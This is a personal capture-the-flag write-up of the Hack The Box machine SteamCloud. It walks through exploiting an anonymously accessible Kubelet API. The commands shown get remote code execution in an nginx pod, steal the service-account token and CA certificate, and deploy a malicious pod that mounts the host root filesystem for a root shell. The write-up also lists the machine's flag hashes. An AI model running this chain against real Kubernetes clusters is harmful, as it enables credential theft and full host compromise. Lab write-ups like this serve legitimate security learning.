# Given

SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes specific ports open. We cannot not enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8s cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate into the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag.

## ip/scope:

# Steps

## Enumeration

Started with an nmap scan of all ports, `nmap -sCV -p- -T3 -oN enum/nmap.out` which showed several open ports

```bash
22/tcp    open  ssh  OpenSSH 7.9p1 Debian 10+deb10u2 (protocol2.0)
2379/tcp  open  ssl/etcd-client?                                             2380/tcp  open  ssl/etcd-server?
8443/tcp  open  ssl/http Golang net/http server
10249/tcp open  http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10250/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10256/tcp open  http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

Googling the ports 2379, 2380 led me to finding out that they're from the Kubernetes service. 

![](../../Assets/Pasted%20image%2020250620111842.png)

Checking Hacktricks for Kubernetes, and Kubelet API pentesting showed me how to interact with the Kubelet API. Managed to get some api endpoints which I should be able to normally.

```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'


Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
```

## Exploiting RCE

 `/run` and `/exec` allow us to run code remotely on the containers. An example of `RCE`. 

 

The `kubeletctl` and `kubectl` binaries for interacting with the kubernetes api, and containers. 

- Run `kubeletctl pods--server 10.10.11.13` to get a list of the pods running on the server.
- We can also use this tool to scan for pods with the RCE vulnerability using `kubeletctl scan rce --server 10.10.11.133`

This shows us that the `nginx` pod is vulnerable to RCE. We can use `kubeletctl exec "id" --server 10.10.11.133 -p nginx -c nginx` to test the RCE.

![](../../Assets/Pasted%20image%2020250620143019.png)

## Initial Foothold

This means we could get the kubernetes server to open a bash shell for us to interact with it. Run `kubeletctl exec "/bin/sh" -s 10.10.11.13 -p nginx -c nginx`

![](../../Assets/Pasted%20image%2020250620143223.png)

### Items to Steal

`token` and `ca/crt` are two files that are located at `/var/run/secrets/kubernetes.io/serviceaccount/`. ==When a pod is created, Kubernetes automatically creates a service account for the pod, and assigns it to the pod by default. The files in the directory are used to authenticate and interact with the Kubernetes API server.==

Use `kubeletctl` to view them, and copy them to our attacking machine.

```bash
kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" --namespace default --pod nginx --container nginx --server 10.10.11.133 > findings/ca.crt

kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" --namespace default --pod nginx --container nginx --server 10.10.11.133 > findings/token
```

## Privilege Escalation

The idea here is that the kubernetes pods are running on a Linux Machine, and we want to essentially break out of the pod, and into the machine's file system.

We can go about doing this by mounting the machine's file system to a kubernetes pod we create using `kubectl`, the `ca.crt` and `token` files.

In order to create a pod, we'll also need a YAML file describing the pod in question.

```yaml
apiVersion: v1 
kind: Pod
metadata:
  name: 0ni-pod
  namespace: default
spec:
  containers:
  - name: 0ni-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

### Add Token to Env Variables

```bash
export token=$(cat findings/token)
```

### Create Pod

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 apply -f oni.yaml
```

The YAML file specifies a mounted drive called `hostfs`, which has a path of `/` meaning it will map the host machine's root directory.

We can check if this worked by using `kubeletctl` to list the pods running on the server.

![](../../Assets/Pasted%20image%2020250620145547.png)

And now we can connect to our pod by issuing the following command

`kubeletctl exec '/bin/sh' --server 10.10.11.133 -p 0ni-pod -c 0ni-pod`

and we have a root shell.

# Findings

1. Ports:
	1. Kubernetes: 2379, 2380
	2. Kubelet API: 10250
	3. Kube Proxy: 10256
	4. Http/s: 10249, 8443
	5. SSH: 22
2. Exposed Kubelet api endpoints

```bash
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
```

3. CA cert and Token files at:
	1. /var/run/secrets/kubernetes.io/serviceaccount/token
	2. /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Creds

- ca.crt file
- token file

# Flags

- User: a27d02d84fde582089d2f05e0bb41041
- Root: 3d282f17d9a882f36b8d10c503fec6a9

# Proof

![](../../Assets/Pasted%20image%2020250620131859.png)

![](../../Assets/Pasted%20image%2020250620140707.png)